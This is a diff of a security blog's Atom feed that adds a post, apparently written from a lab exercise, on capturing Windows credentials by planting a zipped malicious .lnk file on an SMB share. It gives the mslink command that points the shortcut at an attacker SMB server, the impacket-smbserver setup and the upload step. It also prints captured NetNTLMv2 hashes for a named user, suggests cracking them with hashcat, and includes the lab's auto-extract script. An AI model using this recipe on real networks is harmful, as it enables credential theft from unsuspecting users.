@@ -4,13 +4,117 @@
  <title>Spindel</title>
  <link href="https://mvineza.github.io/spindel/atom.xml" rel="self"/>
  <link href="https://mvineza.github.io/spindel/"/>
- <updated>2022-01-23T08:44:45+08:00</updated>
+ <updated>2022-01-24T19:28:34+08:00</updated>
  <id>https://mvineza.github.io</id>
  <author>
    <name>spindel</name>
    <email>rell.vineza14@yahoo.com</email>
  </author>
 
+ 
+ <entry>
+   <title>Zipped LNK files over SMB</title>
+   <link href="https://mvineza.github.io/spindel/2022/01/24/zipped-lnk-files-over-smb"/>
+   <updated>2022-01-24T00:00:00+08:00</updated>
+   <id>https://mvineza.github.io/2022/01/24/Zipped-LNK-Files-over-SMB</id>
+   <content type="html">&lt;h2 id=&quot;overview&quot;&gt;Overview&lt;/h2&gt;
+&lt;p&gt;Attackers can upload a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.zip&lt;/code&gt; file containing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.lnk&lt;/code&gt; file to a smb share. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.link&lt;/code&gt; file can contain malicuous code such as connecting back to attacker’s own evil smb share.&lt;/p&gt;
+
+&lt;p&gt;Once a victim unzips that file, attacker can intercept the user’s hash.&lt;/p&gt;
+
+&lt;h2 id=&quot;requirements&quot;&gt;Requirements&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;SMB share on victim machine that attacker has access&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;steps&quot;&gt;Steps&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Downlod &lt;a href=&quot;http://www.mamachine.org/mslink/index.en.html&quot;&gt;mslink&lt;/a&gt;. You will use that to create a malicuous link file.&lt;/li&gt;
+  &lt;li&gt;Create a malicuous link file that will connect to your own evil share.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;~/data/tools/mslink_v1.3.sh &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; whatever &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; hook &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\\\\&lt;/span&gt;10.11.40.33&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;share &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; hook.lnk
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Compress it.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;zip hook.zip hook.lnk
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Create an SMB share on your attacker machine&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;impacket-smbserver &lt;span class=&quot;nt&quot;&gt;-smb2support&lt;/span&gt; share &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Upload the zip file to the SMB share of victim machine.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smb: \&amp;gt; put hook.zip
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Sit back and enjoy&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Config file parsed
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Callback added &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Callback added &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Config file parsed
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Config file parsed
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Config file parsed
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Incoming connection &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.147.136,50222&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; AUTHENTICATE_MESSAGE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SET&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;ichelleWat,SET&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; User SET&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;ichelleWat authenticated successfully
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; MichelleWat::SET:aaaaaaaaaaaaaaaa:ca86a1caeea26a1753bd2092bb6bb76a:010100000000000080132f632685d701fdefe7ef95805d14000000000100100045005a004d00730073007000670054000300100045005a004d0073007300700067005400020010006a006400440075005900750043004b00040010006a006400440075005900750043004b000700080080132f632685d70106000400020000000800300030000000000000000000000000200000c55f192792fa477d1dab3770e98ac03ac9505a65cb2137d024633f7e80b04eb20a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310031002e00340030002e00330033000000000000000000
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Closing down connection &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.147.136,50222&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Remaining connections &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Incoming connection &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.147.136,50223&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; AUTHENTICATE_MESSAGE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SET&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;ichelleWat,SET&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; User SET&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;ichelleWat authenticated successfully
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; MichelleWat::SET:aaaaaaaaaaaaaaaa:3b1d30ff9e5129ad225cc8129e3a9fa5:010100000000000000aac7632685d701b14749bbc7f0a2db000000000100100045005a004d00730073007000670054000300100045005a004d0073007300700067005400020010006a006400440075005900750043004b00040010006a006400440075005900750043004b000700080000aac7632685d70106000400020000000800300030000000000000000000000000200000c55f192792fa477d1dab3770e98ac03ac9505a65cb2137d024633f7e80b04eb20a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310031002e00340030002e00330033000000000000000000
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Closing down connection &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.147.136,50223&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Remaining connections &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Incoming connection &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.147.136,50224&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; AUTHENTICATE_MESSAGE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SET&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;ichelleWat,SET&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; User SET&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;ichelleWat authenticated successfully
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; MichelleWat::SET:aaaaaaaaaaaaaaaa:39d0e73f4909f98a02f8be457e765a0f:0101000000000000804060642685d701cefc2fd6b5e9dc17000000000100100045005a004d00730073007000670054000300100045005a004d0073007300700067005400020010006a006400440075005900750043004b00040010006a006400440075005900750043004b0007000800804060642685d70106000400020000000800300030000000000000000000000000200000c55f192792fa477d1dab3770e98ac03ac9505a65cb2137d024633f7e80b04eb20a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310031002e00340030002e00330033000000000000000000
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Closing down connection &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.147.136,50224&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Remaining connections &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;You will be able to capture the NLMv2 hashes. You can now use hashcat to crack it.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;other-info&quot;&gt;Other Info&lt;/h2&gt;
+&lt;p&gt;Here is the script that process the zip files inside smb share.&lt;/p&gt;
+
+&lt;div class=&quot;language-batch highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;@echo &lt;span class=&quot;na&quot;&gt;off&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;SET&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Shares\Files&quot;&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;SET&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;extracted&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Shares\extracted&quot;&lt;/span&gt;
+
+&lt;span class=&quot;kd&quot;&gt;powershell&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.exe&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;-NoP -NonI -Command &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Expand-Archive '&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;%source%&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;\*.zip' '&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;%extracted%&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;'&quot;&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;FOR&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;/f &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;tokens=*&quot;&lt;/span&gt; &lt;span class=&quot;vm&quot;&gt;%%G&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;IN&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'dir /s /b &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;%extracted%&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;\..\*.'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;DO&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;explorer&lt;/span&gt; &lt;span class=&quot;vm&quot;&gt;%%G&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+	
+&lt;span class=&quot;nb&quot;&gt;ping&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;-n &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;127&lt;/span&gt;.1&amp;gt;NUL
+&lt;span class=&quot;nb&quot;&gt;taskkill&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;/IM &lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;explorer&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.exe&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;rmdir&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;%extracted%&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;/q /s
+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;del&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;%source%&lt;/span&gt;\&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;.zip &lt;span class=&quot;na&quot;&gt;-j
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.trendmicro.com/en_us/research/17/e/rising-trend-attackers-using-lnk-files-download-malware.html&quot;&gt;How Attackers are Using LNK Files to Download Malware&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+ </entry>
  
  <entry>
    <title>Malicious SCF File Upload</title>
